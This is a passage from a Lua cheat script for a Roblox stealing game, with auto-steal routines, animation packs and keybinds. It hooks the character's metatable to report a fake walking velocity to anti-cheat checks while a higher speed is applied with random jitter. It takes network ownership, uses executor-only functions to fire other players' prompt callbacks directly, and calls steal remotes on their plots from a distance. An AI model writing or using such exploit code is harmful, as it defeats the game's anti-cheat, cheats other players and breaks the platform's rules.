                            _s2VelState.v = value
                            return
                        end
                    end
                    return originalNewIndex(self, key, value)
                end)
                mt.__newindex = replacementNewIndex
            end
    
            setreadonly(mt, true)
            _s2VelState.hooked = true
        end)
        if not ok then _s2VelState.hooked = false end
    end
    
    local function _setupVelChecked(char)
        _velChecked = setmetatable({}, { __mode = "k" })
        _s2VelState.velChecked = _velChecked
        if not char then _s2VelState.root = nil; return nil end
        local hrp = char:WaitForChild("HumanoidRootPart", 5)
        if hrp then
            _s2VelState.root = hrp
            _velChecked[hrp] = true
        end
        return hrp
    end
    
    if LP.Character then
        local _hrp0 = _setupVelChecked(LP.Character)
        _hookVelHRP(_hrp0)
    end
    
    local function _isRagdollState(hum)
        if not hum then return true end
        local st = hum:GetState()
        return hum.PlatformStand
            or st == Enum.HumanoidStateType.Physics
            or st == Enum.HumanoidStateType.Ragdoll
            or st == Enum.HumanoidStateType.FallingDown
    end
    
    local _youtVelRng = Random.new()
    
    local function _applyVelocitySpeed(dir, speed, hrp)
        if not hrp or not hrp.Parent then return end
        if batDesyncTpEnabled or autoBatEnabled or autoBatV2Enabled then return end
        if type(speed) ~= "number" or speed ~= speed or speed <= 0 or speed == math.huge then return end
    
        local verticalVelocity = hrp.AssemblyLinearVelocity.Y
    
        if dir and dir.Magnitude > 0.05 then
            pcall(function()
                if hrp.SetNetworkOwner then hrp:SetNetworkOwner(LP) end
            end)
            local unit = dir.Unit
            local jx = _youtVelRng:NextNumber(-0.003, 0.003)
            local jz = _youtVelRng:NextNumber(-0.003, 0.003)
    
            _s2VelState.v = _V3new(unit.X * 16 + jx, verticalVelocity, unit.Z * 16 + jz)
    
            hrp.AssemblyLinearVelocity = _V3new(unit.X * speed + jx, verticalVelocity, unit.Z * speed + jz)
            _G.__YoutLiveSpeed = { t = os.clock(), v = speed }
        else
            _s2VelState.v = _V3new(0, verticalVelocity, 0)
            hrp.AssemblyLinearVelocity = _V3new(0, verticalVelocity, 0)
        end
    end
    
    function getAutoPathSpeed()
        if laggerCarryToggled or laggerToggled then return LAGGER_SPEED end
        return NS
    end
    
    ANIM_PACKS = {
        ["Zombie"] = { idle1="rbxassetid://616158929", idle2="rbxassetid://616160636", walk="rbxassetid://616168032", run="rbxassetid://616163682", jump="rbxassetid://616161997", fall="rbxassetid://616157476", climb="rbxassetid://616156119", swim="rbxassetid://616165109", swimidle="rbxassetid://616166655" },
        ["Ninja"] = { idle1="rbxassetid://656117400", idle2="rbxassetid://656117400", walk="rbxassetid://656121766", run="rbxassetid://656118852", jump="rbxassetid://656117878", fall="rbxassetid://656115606", climb="rbxassetid://656114359", swim="rbxassetid://656117400", swimidle="rbxassetid://656117400" },
        ["Knight"] = { idle1="rbxassetid://657595757", idle2="rbxassetid://657595757", walk="rbxassetid://657552124", run="rbxassetid://657564596", jump="rbxassetid://658409194", fall="rbxassetid://657600338", climb="rbxassetid://658360781", swim="rbxassetid://657595757", swimidle="rbxassetid://657595757" },
        ["Elder"] = { idle1="rbxassetid://845397899", idle2="rbxassetid://845397899", walk="rbxassetid://845403856", run="rbxassetid://845386501", jump="rbxassetid://845398858", fall="rbxassetid://845397673", climb="rbxassetid://845392038", swim="rbxassetid://845397899", swimidle="rbxassetid://845397899" },
        ["Levitate"] = { idle1="rbxassetid://616006778", idle2="rbxassetid://616006778", walk="rbxassetid://616013216", run="rbxassetid://616013216", jump="rbxassetid://616008936", fall="rbxassetid://616005863", climb="rbxassetid://616003713", swim="rbxassetid://616006778", swimidle="rbxassetid://616006778" },
        ["Astronaut"] = { idle1="rbxassetid://891621366", idle2="rbxassetid://891621366", walk="rbxassetid://891636393", run="rbxassetid://891636393", jump="rbxassetid://891627522", fall="rbxassetid://891617961", climb="rbxassetid://891609353", swim="rbxassetid://891621366", swimidle="rbxassetid://891621366" },
        ["Pirate"] = { idle1="rbxassetid://750781874", idle2="rbxassetid://750781874", walk="rbxassetid://750785693", run="rbxassetid://750783738", jump="rbxassetid://750782230", fall="rbxassetid://750780242", climb="rbxassetid://750779899", swim="rbxassetid://750781874", swimidle="rbxassetid://750781874" },
        ["Toy"] = { idle1="rbxassetid://782841498", idle2="rbxassetid://782841498", walk="rbxassetid://782843345", run="rbxassetid://782842708", jump="rbxassetid://782847020", fall="rbxassetid://782846423", climb="rbxassetid://782843869", swim="rbxassetid://782841498", swimidle="rbxassetid://782841498" },
        ["Vampire"] = { idle1="rbxassetid://1083445855", idle2="rbxassetid://1083445855", walk="rbxassetid://1083473930", run="rbxassetid://1083462077", jump="rbxassetid://1083455352", fall="rbxassetid://1083443587", climb="rbxassetid://1083439238", swim="rbxassetid://1083445855", swimidle="rbxassetid://1083445855" },
        ["Werewolf"] = { idle1="rbxassetid://1083195517", idle2="rbxassetid://1083195517", walk="rbxassetid://1083178339", run="rbxassetid://1083216690", jump="rbxassetid://1083218792", fall="rbxassetid://1083189019", climb="rbxassetid://1083182000", swim="rbxassetid://1083195517", swimidle="rbxassetid://1083195517" },
        ["Rthro"] = { idle1="rbxassetid://2510196951", idle2="rbxassetid://2510196951", walk="rbxassetid://2510202577", run="rbxassetid://2510198475", jump="rbxassetid://2510197830", fall="rbxassetid://2510195892", climb="rbxassetid://2510192778", swim="rbxassetid://2510196951", swimidle="rbxassetid://2510196951" },
        ["Stylish"] = { idle1="rbxassetid://616136790", idle2="rbxassetid://616136790", walk="rbxassetid://616146177", run="rbxassetid://616140816", jump="rbxassetid://616139451", fall="rbxassetid://616134815", climb="rbxassetid://616133594", swim="rbxassetid://616136790", swimidle="rbxassetid://616136790" },
    }
    
    ANIM_PACK_ORDER = {{"Off", "Off"}, {"Zombie", "Zombie"}, {"Ninja", "Ninja"}, {"Knight", "Knight"}, {"Elder", "Elder"}, {"Levitate", "Levitate"}, {"Astronaut", "Astronaut"}, {"Pirate", "Pirate"}, {"Toy", "Toy"}, {"Vampire", "Vampire"}, {"Werewolf", "Werewolf"}, {"Rthro", "Rthro"}, {"Stylish", "Stylish"}}
    
    local function isPackAnim(id)
        for _, pack in pairs(ANIM_PACKS) do
            for _, v in pairs(pack) do
                if v == id then return true end
            end
        end
        return false
    end
    
    local function saveOriginalAnims(char)
        local animate = char:FindFirstChild("Animate")
        if not animate then return end
        local function g(obj) return obj and obj.AnimationId or nil end
        local ids = {
            idle1 = g(animate.idle and animate.idle.Animation1),
            idle2 = g(animate.idle and animate.idle.Animation2),
            walk  = g(animate.walk and animate.walk.WalkAnim),
            run   = g(animate.run  and animate.run.RunAnim),
            jump  = g(animate.jump and animate.jump.JumpAnim),
            fall  = g(animate.fall and animate.fall.FallAnim),
            climb = g(animate.climb and animate.climb.ClimbAnim),
            swim  = g(animate.swim and animate.swim.Swim),
            swimidle = g(animate.swimidle and animate.swimidle.SwimIdle),
        }
        if not isPackAnim(ids.walk) then originalTryardAnims = ids end
    end
    
    local function applyAnimPack(packName)
        currentAnimPack = packName
        if animSelectorLabel then animSelectorLabel.Text = packName end
        if packName == "Off" then
            if originalTryardAnims and LP.Character then
                local animate = LP.Character:FindFirstChild("Animate")
                if animate then
                    local function s(obj,id) if obj then obj.AnimationId = id end end
                    s(animate.idle and animate.idle.Animation1, originalTryardAnims.idle1)
                    s(animate.idle and animate.idle.Animation2, originalTryardAnims.idle2)
                    s(animate.walk and animate.walk.WalkAnim, originalTryardAnims.walk)
                    s(animate.run  and animate.run.RunAnim,   originalTryardAnims.run)
                    s(animate.jump and animate.jump.JumpAnim, originalTryardAnims.jump)
                    s(animate.fall and animate.fall.FallAnim, originalTryardAnims.fall)
                    s(animate.climb and animate.climb.ClimbAnim, originalTryardAnims.climb)
                    s(animate.swim and animate.swim.Swim, originalTryardAnims.swim)
                    s(animate.swimidle and animate.swimidle.SwimIdle, originalTryardAnims.swimidle)
                end
            end
            if tryardHeartbeatConn then tryardHeartbeatConn:Disconnect(); tryardHeartbeatConn = nil end
            return
        end
        local pack = ANIM_PACKS[packName]
        if not pack then return end
        if tryardHeartbeatConn then tryardHeartbeatConn:Disconnect() end
        tryardHeartbeatConn = RunService.Heartbeat:Connect(function()
            local c = LP.Character
            if not c then return end
            local animate = c:FindFirstChild("Animate")
            if not animate then return end
            local function s(obj,id) if obj then obj.AnimationId = id end end
            s(animate.idle and animate.idle.Animation1, pack.idle1)
            s(animate.idle and animate.idle.Animation2, pack.idle2)
            s(animate.walk and animate.walk.WalkAnim, pack.walk)
            s(animate.run  and animate.run.RunAnim,   pack.run)
            s(animate.jump and animate.jump.JumpAnim, pack.jump)
            s(animate.fall and animate.fall.FallAnim, pack.fall)
            s(animate.climb and animate.climb.ClimbAnim, pack.climb)
            s(animate.swim and animate.swim.Swim, pack.swim)
            s(animate.swimidle and animate.swimidle.SwimIdle, pack.swimidle)
        end)
    end
    
    local function startAnimPack(packName)
        local char = LP.Character
        if char then
            saveOriginalAnims(char)
            applyAnimPack(packName)
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                for _, track in ipairs(hum:GetPlayingAnimationTracks()) do track:Stop(0) end
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
        else
            applyAnimPack(packName)
        end
        currentAnimPack = packName
    end
    
    local function stopAnimPack()
        currentAnimPack = "Off"
        if animSelectorLabel then animSelectorLabel.Text = "Off" end
        applyAnimPack("Off")
    end
    
    DEFAULT_KB = {
        DropBrainrot = {kb = Enum.KeyCode.X, gp = nil},
        AutoLeft     = {kb = Enum.KeyCode.Z, gp = nil},
        AutoRight    = {kb = Enum.KeyCode.C, gp = nil},
        AutoBat      = {kb = Enum.KeyCode.E, gp = nil},
        GuiHide      = {kb = Enum.KeyCode.LeftControl, gp = nil},
        CarryToggle  = {kb = Enum.KeyCode.Q, gp = nil},
        LaggerMode   = {kb = Enum.KeyCode.R, gp = nil},
        TPBat        = {kb = Enum.KeyCode.V, gp = nil},
        InstaReset   = {kb = Enum.KeyCode.H, gp = nil},
        BatV2        = {kb = Enum.KeyCode.B, gp = nil},
        TPFloor      = {kb = Enum.KeyCode.F, gp = nil},
    }
    
    KB = {
        DropBrainrot = {kb = DEFAULT_KB.DropBrainrot.kb, gp = DEFAULT_KB.DropBrainrot.gp},
        AutoLeft     = {kb = DEFAULT_KB.AutoLeft.kb, gp = DEFAULT_KB.AutoLeft.gp},
        AutoRight    = {kb = DEFAULT_KB.AutoRight.kb, gp = DEFAULT_KB.AutoRight.gp},
        AutoBat      = {kb = DEFAULT_KB.AutoBat.kb, gp = DEFAULT_KB.AutoBat.gp},
        GuiHide      = {kb = DEFAULT_KB.GuiHide.kb, gp = DEFAULT_KB.GuiHide.gp},
        CarryToggle  = {kb = DEFAULT_KB.CarryToggle.kb, gp = DEFAULT_KB.CarryToggle.gp},
        LaggerMode   = {kb = DEFAULT_KB.LaggerMode.kb, gp = DEFAULT_KB.LaggerMode.gp},
        TPBat        = {kb = DEFAULT_KB.TPBat.kb, gp = DEFAULT_KB.TPBat.gp},
        InstaReset   = {kb = DEFAULT_KB.InstaReset.kb, gp = DEFAULT_KB.InstaReset.gp},
        BatV2        = {kb = DEFAULT_KB.BatV2.kb, gp = DEFAULT_KB.BatV2.gp},
        TPFloor      = {kb = DEFAULT_KB.TPFloor.kb, gp = DEFAULT_KB.TPFloor.gp},
    }
    
    _isResetting = false
    _lastSavedJSON = nil
    _isLoading = false
    
    CONFIG = { AUTO_STEAL_ENABLED = false, STEAL_RANGE = 61 }
    
    local plots = Workspace:FindFirstChild("Plots")
    local stealConnection = nil
    
    local Steal = { AutoStealEnabled = false, StealRadius = CONFIG.STEAL_RANGE, StealDuration = 1.3, StealDelay = 0.25, Data = {} }
    
    local isStealing = false
    local autoGrabSetDelayRadius = 9
    local autoGrabStopTime = 0.96
    local autoGrabStopEnabled = true
    
    local _plotsCache = nil
    local _plotsCacheTime = 0
    local function getPlotsRoot()
        local now = _tick()
        if _plotsCache and now - _plotsCacheTime < 2 and _plotsCache.Parent then
            return _plotsCache
        end
        _plotsCache = workspace:FindFirstChild("Plots")
        _plotsCacheTime = now
        return _plotsCache
    end
    
    local function isMyPlotByName(plotName)
        local plotsRoot = getPlotsRoot()
        if not plotsRoot then return false end
        local plot = plotsRoot:FindFirstChild(plotName)
        if not plot then return false end
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local yb = sign:FindFirstChild("YourBase")
            if yb and yb:IsA("BillboardGui") then
                return yb.Enabled == true
            end
        end
        return false
    end
    
    local function findNearestPrompt()
        local char = LP.Character
        if not char then return nil, nil end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return nil, nil end
        local plotsRoot = getPlotsRoot()
        if not plotsRoot then return nil, nil end
        local nearestPrompt, nearestDist, nearestName = nil, _huge, nil
        local rpos = root.Position
        for _, plot in ipairs(plotsRoot:GetChildren()) do
            if isMyPlotByName(plot.Name) then continue end
            local pods = plot:FindFirstChild("AnimalPodiums")
            if not pods then continue end
            for _, pod in ipairs(pods:GetChildren()) do
                pcall(function()
                    local base = pod:FindFirstChild("Base")
                    local spawn = base and base:FindFirstChild("Spawn")
                    if spawn then
                        local sp = spawn.Position
                        local dx = sp.X - rpos.X
                        local dy = sp.Y - rpos.Y
                        local dz = sp.Z - rpos.Z
                        local dist = _sqrt(dx*dx + dy*dy + dz*dz)
                        if dist < nearestDist and dist <= Steal.StealRadius then
                            local att = spawn:FindFirstChild("PromptAttachment")
                            if att then
                                for _, child in ipairs(att:GetChildren()) do
                                    if child:IsA("ProximityPrompt") and child.ActionText and child.ActionText:find("Steal") then
                                        nearestPrompt = child
                                        nearestDist = dist
                                        nearestName = pod.Name
                                        break
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
        return nearestPrompt, nearestName
    end
    
    local function executeSteal(prompt, podName)
        if isStealing then return end
        if math.random(30) == 1 then
            for p in pairs(Steal.Data) do
                if not p.Parent then Steal.Data[p] = nil end
            end
        end
        if not Steal.Data[prompt] then
            Steal.Data[prompt] = { hold = {}, trigger = {}, ready = true }
            pcall(function()
                if getconnections then
                    for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
                        if c.Function then table.insert(Steal.Data[prompt].hold, c.Function) end
                    end
                    for _, c in ipairs(getconnections(prompt.Triggered)) do
                        if c.Function then table.insert(Steal.Data[prompt].trigger, c.Function) end
                    end
                end
            end)
        end
        local data = Steal.Data[prompt]
        if not data.ready then return end
        data.ready = false
        isStealing = true
    
        if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
        if progressPct then progressPct.Text = "0%" end
    
        task.spawn(function()
            for _, f in ipairs(data.hold) do task.spawn(f) end
    
            local startTime = _tick()
            local duration = Steal.StealDuration
            local promptFired = false
    
            if autoGrabStopEnabled then
                while isStealing and Steal.AutoStealEnabled do
                    local elapsed = _tick() - startTime
                    if elapsed >= autoGrabStopTime then break end
                    local progress = _clamp(elapsed / duration, 0, 1)
                    if progressFill then progressFill.Size = UDim2.new(progress, 0, 1, 0) end
                    if progressPct then progressPct.Text = _floor(progress * 100) .. "%" end
                    if not prompt.Parent or not prompt.Parent.Parent then break end
                    local char = LP.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    if hrp and (hrp.Position - prompt.Parent.Parent.Position).Magnitude > Steal.StealRadius then
                        break
                    end
                    task.wait()
                end
    
                local stopProgress = _clamp(autoGrabStopTime / duration, 0, 1)
                if progressFill then progressFill.Size = UDim2.new(stopProgress, 0, 1, 0) end
                if progressPct then progressPct.Text = _floor(stopProgress * 100) .. "%" end
    
                local phase2Timeout = math.max(2.99 - autoGrabStopTime - math.max(duration - autoGrabStopTime, 0), 0.05)
                local phase2Start = _tick()
    
                while isStealing and Steal.AutoStealEnabled do
                    if _tick() - phase2Start >= phase2Timeout then
                        if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
                        if progressPct then progressPct.Text = "0%" end
                        data.ready = true
                        isStealing = false
                        task.wait()
                        local newPrompt, newName = findNearestPrompt()
                        if newPrompt then executeSteal(newPrompt, newName) end
                        return
                    end
                    if not prompt.Parent or not prompt.Parent.Parent then
                        isStealing = false
                        if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
                        if progressPct then progressPct.Text = "0%" end
                        data.ready = true
                        return
                    end
                    local char = LP.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local dist = (hrp.Position - prompt.Parent.Parent.Position).Magnitude
                        if dist <= autoGrabSetDelayRadius then
                            break
                        elseif dist > Steal.StealRadius then
                            isStealing = false
                            if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
                            if progressPct then progressPct.Text = "0%" end
                            data.ready = true
                            return
                        end
                    end
                    task.wait()
                end
    
                if isStealing and Steal.AutoStealEnabled then
                    local fillStart = _tick()
                    local fillDuration = math.max(duration - autoGrabStopTime, 0.05)
                    while true do
                        local fp = _clamp((_tick() - fillStart) / fillDuration, 0, 1)
                        local totalProgress = stopProgress + fp * (1 - stopProgress)
                        if progressFill then progressFill.Size = UDim2.new(totalProgress, 0, 1, 0) end
                        if progressPct then progressPct.Text = _floor(totalProgress * 100) .. "%" end
                        if fp >= 1 and not promptFired then
                            promptFired = true
                            pcall(function()
                                if #data.trigger > 0 then
                                    for _, f in ipairs(data.trigger) do task.spawn(f) end
                                else
                                    local remote = ReplicatedStorage:FindFirstChild("StealAnimal")
                                    if remote and podName then remote:FireServer(podName) end
                                end
                            end)
                            break
                        end
                        task.wait()
                    end
                end
            else
                while isStealing and Steal.AutoStealEnabled do
                    local elapsed = _tick() - startTime
                    local progress = _clamp(elapsed / duration, 0, 1)
                    if progressFill then progressFill.Size = UDim2.new(progress, 0, 1, 0) end
                    if progressPct then progressPct.Text = _floor(progress * 100) .. "%" end
                    if not prompt.Parent or not prompt.Parent.Parent then break end
                    local char = LP.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    if hrp and (hrp.Position - prompt.Parent.Parent.Position).Magnitude > Steal.StealRadius then break end
                    if elapsed >= duration and not promptFired then
                        promptFired = true
                        pcall(function()
                            if #data.trigger > 0 then
                                for _, f in ipairs(data.trigger) do task.spawn(f) end
                            else
                                local remote = ReplicatedStorage:FindFirstChild("StealAnimal")
                                if remote and podName then remote:FireServer(podName) end
                            end
                        end)
                        break
                    end
                    task.wait()
                end
            end
    
            if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
            if progressPct then progressPct.Text = "0%" end
            data.ready = true
            isStealing = false
        end)
    end
    
    -- =====================================================================
    -- AUTO STEAL V2
    -- =====================================================================
    _G.YoutV2Steal = _G.YoutV2Steal or {
        enabled = false, radius = 10, primeRange = 80, holdMin = 1.3, holdMax = 2.6,
        entryDelay = 0.25, cooldown = 0.05,
        animals = {}, promptCache = {}, internalCache = {},
        state = {active = false, startTime = 0, phase = "idle", label = "", lastResult = "", lastResultTime = 0},
        plotSync = {caches = {}, connections = {}}, plots = nil, syncReady = false,
        scanThread = nil, conn = nil, lastScan = 0,
        animalsData = nil, channelFolder = nil, routeRemote = nil, requestData = nil
    }
    
    local function _yv2Root()
        local c = LP.Character
        return c and (c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("UpperTorso")) or nil
    end
    
    local function _yv2SplitPath(path)
        if typeof(path) == "table" then return path end
        local out = {}
        for p in string.gmatch(tostring(path), "[^%.]+") do table.insert(out, tonumber(p) or p) end
        return out
    end
    
    local function _yv2ResolvePath(path, root)
        local cur, par, key = root, nil, nil
        for _, p in ipairs(_yv2SplitPath(path)) do
            par = cur; key = p; cur = cur and cur[p] or nil
        end
        return cur, par, key
    end
    
    local function _yv2ApplyDiff(channelName, packet)
        local cache = _G.YoutV2Steal.plotSync.caches[channelName]
        if typeof(cache) ~= "table" then return end
        local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
        local cur, par, key = _yv2ResolvePath(path, cache)
        if action == "Changed" then
            if par then par[key] = a end
        elseif action == "ArrayInsert" then
            if cur then table.insert(cur, b, a) end
        elseif action == "ArrayRemoved" then
            if cur then table.remove(cur, b) end
        elseif action == "DictionaryInsert" then
            if cur then cur[b] = a end
        elseif action == "DictionaryRemoved" then
            if cur then cur[b] = nil end
        end
    end
    
    local function _yv2AttachChannel(remote, plots, requestData)
        local A = _G.YoutV2Steal
        if A.plotSync.connections[remote] then return end
        local channelName = tostring(remote.Name)
        if not plots:FindFirstChild(channelName) then return end
        if requestData and A.plotSync.caches[channelName] == nil then
            local ok, data = pcall(function() return requestData:InvokeServer(channelName) end)
            A.plotSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
        elseif A.plotSync.caches[channelName] == nil then
            A.plotSync.caches[channelName] = {}
        end
        A.plotSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
            for _, packet in ipairs(queue) do _yv2ApplyDiff(channelName, packet) end
        end)
    end
    
    local function _yv2EnsureSync()
        local A = _G.YoutV2Steal
        if A.syncReady then return true end
        local ok = pcall(function()
            A.plots = workspace:WaitForChild("Plots", 8)
            local rs = game:GetService("ReplicatedStorage")
            local pkgs = rs:FindFirstChild("Packages")
            local datas = rs:FindFirstChild("Datas")
            if not (pkgs and datas and A.plots) then return end
            A.animalsData = require(datas:WaitForChild("Animals", 10))
            local sync = pkgs:FindFirstChild("Synchronizer") or pkgs:WaitForChild("Synchronizer", 10)
            if not sync then return end
            A.channelFolder = sync:FindFirstChild("Channel") or sync:WaitForChild("Channel", 10)
            A.routeRemote = sync:FindFirstChild("CommunicationRoute") or sync:WaitForChild("CommunicationRoute", 10)
            A.requestData = sync:FindFirstChild("RequestData")
            if A.channelFolder then
                for _, child in ipairs(A.channelFolder:GetChildren()) do
                    if child:IsA("RemoteEvent") then _yv2AttachChannel(child, A.plots, A.requestData) end
                end
                A.channelFolder.ChildAdded:Connect(function(child)
                    if child:IsA("RemoteEvent") then _yv2AttachChannel(child, A.plots, A.requestData) end
                end)
            end
            if A.routeRemote then
                A.routeRemote.OnClientEvent:Connect(function(actions)
                    for _, action in ipairs(actions) do
                        local kind, cn = action[1], tostring(action[2])
                        if A.plots and A.plots:FindFirstChild(cn) then
                            if kind == "ListenerAdded" then
                                local r = A.channelFolder and A.channelFolder:FindFirstChild(cn)
                                if r and r:IsA("RemoteEvent") then _yv2AttachChannel(r, A.plots, A.requestData) end
                            elseif kind == "ListenerRemoved" then
                                for remote, conn in pairs(A.plotSync.connections) do
                                    if tostring(remote.Name) == cn then
                                        pcall(function() conn:Disconnect() end)
                                        A.plotSync.connections[remote] = nil
                                        A.plotSync.caches[cn] = nil
                                        break
                                    end
                                end
                            end
                        end
                    end
                end)
            end
            A.syncReady = true
        end)
        return ok and A.syncReady == true
    end
    
    local function _yv2PlotOwner(plot)
        local sign = plot and plot:FindFirstChild("PlotSign")
        local frame = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
        local label = frame and frame:FindFirstChild("TextLabel")
        if not label or label.Text == "Empty Base" then return nil end
        return label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
    end
    
    local function _yv2IsMyBase(animalData)
        local A = _G.YoutV2Steal
        if not animalData or not animalData.plot or not A.plots then return false end
        local plot = A.plots:FindFirstChild(animalData.plot)
        if not plot then return false end
        local owner = _yv2PlotOwner(plot)
        return owner == LP.DisplayName or owner == LP.Name
    end
    
    local function _yv2PodiumFor(animalData)
        local A = _G.YoutV2Steal
        local plot = A.plots and A.plots:FindFirstChild(animalData.plot)
        local pds = plot and plot:FindFirstChild("AnimalPodiums")
        return pds and pds:FindFirstChild(animalData.slot) or nil
    end
    
    local function _yv2AnimalPos(animalData)
        local pod = _yv2PodiumFor(animalData)
        return pod and pod:GetPivot().Position or nil
    end
    
    local function _yv2DistToAnimal(animalData)
        local root = _yv2Root()
        local pos = _yv2AnimalPos(animalData)
        return root and pos and (root.Position - pos).Magnitude or math.huge
    end
    
    local function _yv2FindPrompt(animalData)
        local A = _G.YoutV2Steal
        if not animalData then return nil end
        local cached = A.promptCache[animalData.uid]
        if cached and cached.Parent then return cached end
        local pod = _yv2PodiumFor(animalData)
        if not pod then return nil end
        for _, p in ipairs(pod:GetDescendants()) do
            if p:IsA("ProximityPrompt") then A.promptCache[animalData.uid] = p return p end
        end
        return nil
    end
    
    local function _yv2BuildCallbacks(prompt)
        local A = _G.YoutV2Steal
        if A.internalCache[prompt] then return end
        local data = {holdCallbacks = {}, triggerCallbacks = {}, ready = true}
        pcall(function()
            if getconnections then
                local holds = getconnections(prompt.PromptButtonHoldBegan) or getconnections(prompt.HoldBegan) or {}
                for _, c in ipairs(holds) do
                    if type(c.Function) == "function" then table.insert(data.holdCallbacks, c.Function) end
                end
                local triggers = getconnections(prompt.Triggered) or {}
                for _, c in ipairs(triggers) do
                    if type(c.Function) == "function" then table.insert(data.triggerCallbacks, c.Function) end
                end
            end
        end)
        A.internalCache[prompt] = data
    end
    
    local function _yv2SetBar(p)
        if progressFill then progressFill.Size = UDim2.new(math.clamp(p, 0, 1), 0, 1, 0) end
        if progressPct then progressPct.Text = _floor(math.clamp(p, 0, 1) * 100) .. "%" end
    end
    
    local function _yv2ResetBar()
        if progressFill then progressFill.Size = UDim2.new(0, 0, 1, 0) end
        if progressPct then progressPct.Text = "0%" end
    end
    
    local function _yv2Execute(prompt, animalData)
        local A = _G.YoutV2Steal
        if not prompt or not prompt.Parent or not animalData then return false end
        if A.state.active then return false end
        if _tick() - (A.state.lastResultTime or 0) < (A.cooldown or 0.05) then return false end
        _yv2BuildCallbacks(prompt)
        local data = A.internalCache[prompt]
        if not data or not data.ready then return false end
        data.ready = false
        A.state.active = true
        A.state.startTime = _tick()
        A.state.phase = "holding"
        A.state.label = animalData.name or "Animal"
        task.spawn(function()
            local t0 = A.state.startTime
            local stops = {0.70, 0.75, 0.80, 0.85, 0.90}
            local SEMI_STOP = stops[math.random(1, #stops)]
            if #data.holdCallbacks > 0 then
                for _, fn in ipairs(data.holdCallbacks) do task.spawn(function() pcall(fn) end) end
            else
                pcall(function() if prompt.InputHoldBegin then prompt:InputHoldBegin() end end)
            end
            while A.enabled and selectedStealMode == "V2" and CONFIG.AUTO_STEAL_ENABLED and _tick() - t0 < (A.holdMin or 1.3) do
                local rawP = (_tick() - t0) / (A.holdMax or 2.6)
                _yv2SetBar(math.min(rawP, SEMI_STOP))
                task.wait()
            end
            A.state.phase = "waitingRange"
            local alreadyInRange = _yv2DistToAnimal(animalData) <= (tonumber(A.radius) or 10)
            local fired = false
            while A.enabled and selectedStealMode == "V2" and CONFIG.AUTO_STEAL_ENABLED and prompt.Parent do
                local elapsed = _tick() - t0
                if elapsed > (A.holdMax or 2.6) then break end
                local rawP2 = elapsed / (A.holdMax or 2.6)
                _yv2SetBar(math.min(rawP2, SEMI_STOP))
                if _yv2DistToAnimal(animalData) <= (tonumber(A.radius) or 10) then
                    if not alreadyInRange then task.wait(A.entryDelay or 0.25) end
                    if A.enabled and selectedStealMode == "V2" and CONFIG.AUTO_STEAL_ENABLED then
                        if #data.triggerCallbacks > 0 then
                            for _, fn in ipairs(data.triggerCallbacks) do task.spawn(function() pcall(fn) end) end
                        else
                            pcall(function() if prompt.InputHoldEnd then prompt:InputHoldEnd() end end)
                        end
                        fired = true
                    end
                    break
                end
                task.wait()
            end
            A.state.lastResult = fired and ("Stole " .. tostring(A.state.label)) or "Missed"
            A.state.active = false
            A.state.phase = "idle"
            A.state.lastResultTime = _tick()
            if fired then _yv2SetBar(1) end
            task.wait(A.cooldown or 0.05)
            data.ready = true
            _yv2ResetBar()
        end)
        return true
    end
    
    local function _yv2ScanAllPlots()
        local A = _G.YoutV2Steal
        if not _yv2EnsureSync() then return 0 end
        local newCache = {}
        for _, plot in ipairs(A.plots:GetChildren()) do
            local cache = A.plotSync.caches[plot.Name]
            local animalList = cache and cache.AnimalList
            if typeof(animalList) == "table" then
                for slot, animalData in pairs(animalList) do
                    if type(animalData) == "table" then
                        local animalName = animalData.Index
                        local info = A.animalsData and A.animalsData[animalName]
                        if info then
                            table.insert(newCache, {
                                name = info.DisplayName or animalName,
                                plot = plot.Name,
                                slot = tostring(slot),
                                uid = plot.Name .. "_" .. tostring(slot)
                            })
                        end
                    end
                end
            end
        end
        A.animals = newCache
        return #newCache
    end
    
    local function _yv2PickClosest()
        local A = _G.YoutV2Steal
        local root = _yv2Root()
        if not root then return nil end
        local best, bestDist = nil, math.huge
        for _, data in ipairs(A.animals) do
            if not _yv2IsMyBase(data) then
                local pos = _yv2AnimalPos(data)
                local dist = pos and (root.Position - pos).Magnitude or math.huge
                if dist <= (A.primeRange or 80) and dist < bestDist then
                    best, bestDist = data, dist
                end
            end
        end
        return best
    end
    
    local function _yv2EnsureScanThread()
        local A = _G.YoutV2Steal
        if A.scanThread then return end
        A.scanThread = task.spawn(function()
            while _G.YoutV2Steal do
                if A.enabled or selectedStealMode == "V2" then pcall(_yv2ScanAllPlots) end
                task.wait(5)
            end
        end)
    end
    
    function stopAutoStealV2()
        local A = _G.YoutV2Steal
        A.enabled = false
        if A.conn then A.conn:Disconnect() A.conn = nil end
        A.state.active = false
        A.state.phase = "idle"
        _yv2ResetBar()
    end
    
    function startAutoStealV2()
        local A = _G.YoutV2Steal
        A.radius = 10
        A.enabled = true
        pcall(_yv2EnsureSync)
        _yv2EnsureScanThread()
        pcall(_yv2ScanAllPlots)
        if A.conn then A.conn:Disconnect() A.conn = nil end
        A.conn = RunService.Heartbeat:Connect(function()
            if not A.enabled or not CONFIG.AUTO_STEAL_ENABLED or selectedStealMode ~= "V2" or A.state.active then return end
            local target = _yv2PickClosest()
            if not target then
                if _tick() - (A.lastScan or 0) > 1.2 then
                    A.lastScan = _tick()
                    pcall(_yv2ScanAllPlots)
                end
                return
            end
            local prompt = _yv2FindPrompt(target)
            if prompt then _yv2Execute(prompt, target) end
        end)
    end
    
    local function _startAutoStealV1()
        if stealConnection then
